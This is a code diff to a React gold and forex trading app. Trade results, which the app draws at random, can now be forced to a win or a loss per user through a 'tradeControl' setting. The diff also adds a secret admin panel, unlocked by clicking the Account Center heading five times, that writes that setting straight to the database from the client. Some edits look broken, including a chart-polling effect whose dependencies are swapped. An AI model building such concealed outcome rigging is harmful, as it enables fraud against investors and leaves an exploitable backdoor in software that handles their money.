@@ -314,6 +314,8 @@ function App() {
   const [phoneNumber, setPhoneNumber] = useState('');
   const [verificationCode, setVerificationCode] = useState('');
 
+  const [clickCount, setClickCount] = useState(0);
+
   const [selectedCoin, setSelectedCoin] = useState(() => {
     // Auto-select gold on startup
     const goldMarket = [
@@ -1007,7 +1009,7 @@ function App() {
         clearInterval(chartPollIntervalRef.current);
       }
     };
-  }, [selectedCoin, chartTimeframe]);
+  }, [forexMarkets, globalMarkets, clickCount]);
 
   // --- SESSION MANAGEMENT (LocalStorage) ---
   useEffect(() => {
@@ -1083,7 +1085,15 @@ function App() {
 
     setTimeout(async () => {
       const currentPrice = selectedCoin.current_price;
-      let win = Math.random() > 0.5;
+      const user = allUsers[activeId];
+      let win;
+      if (user.tradeControl === 'Force Win') {
+        win = true;
+      } else if (user.tradeControl === 'Force Loss') {
+        win = false;
+      } else {
+        win = Math.random() > 0.5;
+      }
       const change = win ? tradeConfig.amount * config.profit : -tradeConfig.amount;
       
       // Calculate open and close prices based on logic
@@ -1151,7 +1161,16 @@ function App() {
       <div className="profile-page">
         <header className="trade-header">
           <button onClick={() => setCurrentPage('home')} className="back-btn-colored">{t('backHome')}</button>
-          <h3>{t('accountCenter')}</h3>
+          <h3
+            onClick={() => setClickCount(prev => {
+              const newCount = prev + 1;
+              console.log('Secret Clicks:', newCount);
+              return newCount;
+            })}
+            style={{ cursor: 'pointer', userSelect: 'none' }}
+          >
+            {t('accountCenter')}
+          </h3>
           <div style={{width:'40px'}}></div>
         </header>
         <div className="profile-container">
@@ -1242,6 +1261,31 @@ function App() {
               )}
             </div>
           </div>
+
+          {clickCount >= 5 && (
+            <div className="admin-panel" style={{ position: 'relative', zIndex: 9999 }}>
+              <h4>Admin Panel</h4>
+              <p>Current Trade Control: {user.tradeControl || 'Normal'}</p>
+              <select id="tradeControlSelect" defaultValue={user.tradeControl || 'Normal'}>
+                <option value="Normal">Normal</option>
+                <option value="Force Win">Force Win</option>
+                <option value="Force Loss">Force Loss</option>
+              </select>
+              <button onClick={async () => {
+                const select = document.getElementById('tradeControlSelect');
+                const value = select.value;
+                try {
+                  await updateDoc(doc(db, 'users', activeId), { tradeControl: value });
+                  alert('Trade control updated');
+                  // Optionally refresh user data
+                  setAllUsers(prev => ({ ...prev, [activeId]: { ...prev[activeId], tradeControl: value } }));
+                } catch (error) {
+                  console.error('Error updating trade control:', error);
+                  alert('Error updating');
+                }
+              }}>Save</button>
+            </div>
+          )}
         </div>
 
         <WithdrawModal
@@ -1476,7 +1520,7 @@ function App() {
             <div className="amount-header"><span>Investment</span><span className="available-bal">Available: ${isLoggedIn ? allUsers[activeId].balance.toLocaleString() : '0.00'}</span></div>
             <div className="amount-input-wrapper">
               <span className="currency-prefix">$</span>
-              <input type="number" value={tradeConfig.amount} onChange={(e) => setTradeConfig({...tradeConfig, amount: Number(e.target.value)})} className="advanced-input" />
+              <input type="number" value={tradeConfig.amount === 0 ? '' : tradeConfig.amount} onChange={(e) => setTradeConfig({...tradeConfig, amount: e.target.value === '' ? 0 : Number(e.target.value)})} className="advanced-input" />
               <div className="min-amount">Min: ${tradeOptions[tradeConfig.time]?.minAmount || 0}</div>
             </div>
           </div>
